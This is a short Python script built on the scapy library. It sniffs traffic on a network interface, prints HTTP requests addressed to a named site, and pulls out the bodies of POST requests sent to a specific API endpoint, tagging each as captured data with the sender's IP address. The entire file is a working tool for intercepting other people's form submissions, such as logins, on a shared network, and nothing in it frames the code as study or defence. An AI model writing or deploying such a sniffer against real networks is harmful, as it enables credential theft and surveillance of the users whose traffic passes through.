from scapy.all import *
import re

def sniffData(pkt):
    if pkt.haslayer( Raw ):   # Check for the Data layer
        header = pkt.getlayer( Raw ).load    # Get the sent data
        if header.startswith(bytes('GET', 'utf-8')) or header.startswith(bytes('POST', 'utf-8')):     # Make sure it's a request
            if bytes('www.mastodon.org', 'utf-8') in header:
                src = pkt.getlayer(IP).src
                print(header)
                print('------------------------------------')
                if header.startswith(bytes('POST', 'utf-8')):
                    if bytes('/api/ServicesConnection.php', 'utf-8') in header:
                        data = header.split(bytes('\r\n\r\n','utf-8'))[1]
                        print(("[%s] POST data Captured: %s" % (src, data)))
                        print('------------------------------------')
sniff(iface="enp0s20f0u1u4", prn=sniffData)